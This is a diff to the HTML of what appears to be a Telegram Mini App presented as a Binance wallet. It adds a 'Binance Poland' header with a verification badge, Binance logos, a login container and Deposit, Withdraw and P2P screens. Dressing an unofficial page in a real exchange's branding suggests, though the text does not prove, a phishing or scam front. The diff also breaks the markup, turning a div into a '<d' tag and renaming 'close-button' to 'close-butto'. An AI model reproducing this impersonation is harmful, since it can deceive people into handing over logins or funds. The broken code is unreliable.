@@ -14,14 +14,23 @@
 
     tg.ready();
 
-    // Set header background color only
+    if (tg.isVersionAtLeast("8.0")) {
+      tg.requestFullscreen();
+    } else {
+      tg.expand();
+    }
+
     tg.setHeaderColor("#181A20");
   });
 </script>
  </head> 
+ 
+  
 <body>
+       <div class="top-bar-head">Binance Poland&nbsp<img src="https://cdn-icons-png.flaticon.com/128/7641/7641727.png" alt="BTC" class="top-bar-verif"></div>
+
   
-  
+    <main>
   
   <div class="card" hidden>    
   <h1>Wallet Balance</h1>
@@ -31,7 +40,7 @@
 </div>
   
   
-  
+
     <div id="login-container-one" class="login-container-one"> 
      <img src="https://www.amberdata.io/hs-fs/hubfs/Binance-Logo.wine.png?width=480&name=Binance-Logo.wine.png" alt="BTC" class="binance-icon">
      <div class=""></div>
@@ -120,7 +129,7 @@
   
   
   
-  <div id="home-page" class="home-page hidden">  
+  <div id="home-page" class="home-page hidden">   
     
     <!--<button id="logout-button">Log out</button>-->
   
@@ -148,9 +157,9 @@
     
     <div class="top-menu-buttons">
     <button id="deposit-button-top" class="modal-button-top">Deposit</button>
-    <button id="send-button-top" class="modal-button-top">Withdraw</button>
-    <button id="p2p-button" class="modal-button-top">P2P</button>
-<!--<button id="convert-butto" class="modal-button">Convert</button>--> 
+    <button id="send-button-top" class="modal-button-top">Withdraw</button> 
+    <button id="p2p-buttoner" class="modal-button-top">P2P</button> 
+<!--<button id="convert-butto" class="modal-button">Convert</button>-->  
 
     </div>
      
@@ -557,7 +566,7 @@ setInterval(fetchBNBPrice, 120000);
    
     <div class="express-container"> 
         
-        <main>
+        
            <!-- <div class="express-title">P2P Express</div>
             <div class="express-subtitle">Buy USDT with USD</div>
             <div class="express-description">Buy and Sell USDT on Binance P2P with various payment methods</div> -->
@@ -590,7 +599,7 @@ setInterval(fetchBNBPrice, 120000);
                 <button id="express-payment-preview" class="express-payment-preview" disabled>Preview</button> 
             </div>
           
-        </main>  
+          
     </div>
      
      </div>
@@ -599,7 +608,7 @@ setInterval(fetchBNBPrice, 120000);
   
      
    
-      <div id="express-confirm-modal" class="modal"> 
+      <d id="express-confirm-modal" class="modal"> 
   <div class="modal-content"> 
         <div class="express-payment-blur" onclick="document.querySelector('#express-confirm-modal').style.display='none';document.querySelector('#convert-modal').style.display='block';"></div
           >
@@ -672,16 +681,18 @@ setInterval(fetchBNBPrice, 120000);
 </ul>
          </div>
          </div>
+
+
   
 
   <!-- Modal for P2P transaction page -->
   <div id="p2p-modal" class="modal">
     <div class="modal-content"> 
-      <span class="close-button"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></span>
+      <span class="close-butto"><span class="material-symbols-outlined"><img src="https://cdn-icons-png.flaticon.com/128/10728/10728756.png" alt="Back"></span></span>
     <img src="https://www.amberdata.io/hs-fs/hubfs/Binance-Logo.wine.png?width=480&name=Binance-Logo.wine.png" alt="BTC" class="binance-icon-two">
       
       <div class="become-merchant-area">   
-        <div><img src="https://cdn-icons-png.flaticon.com/128/3602/3602342.png" alt="notifications" class="become-image"></div>
+        <div><img src="https://cdn-icons-png.flaticon.com/128/3602/3602342.png" alt="notifications" class="become-image"></div>  
       </div>  
       
         <nav>
@@ -697,11 +708,7 @@ setInterval(fetchBNBPrice, 120000);
   <option value="INR">INR</option>--> 
 </select>
 
-
-
-
-
-        <div class="crypto-selector">
+ <div class="crypto-selector">
             <button class="active active-buy">BTC</button>
             <button>ETH</button>
             <button>USDT</button>
@@ -723,6 +730,10 @@ setInterval(fetchBNBPrice, 120000);
         <div class="p2p-ads" id="p2p-ads"><img src="https://cdn-icons-png.flaticon.com/128/726/726186.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Ads</div></div>
         <div class="p2p-profile"><img src="https://cdn-icons-png.flaticon.com/128/456/456212.png" class="p2p-bottom-img"><div class="p2p-btm-txt">Profile</div></div>
       </div>
+      
+    </div>
+</div>
+      
       
       
       
@@ -1333,15 +1344,14 @@ setInterval(fetchPiPrice, 120000);
          
   </div>
    
-     
  </div>
+      </main>
+    
+    
     <script src="script.js"></script>
 </body>
   
 
   
 </html>
-
-
-
 
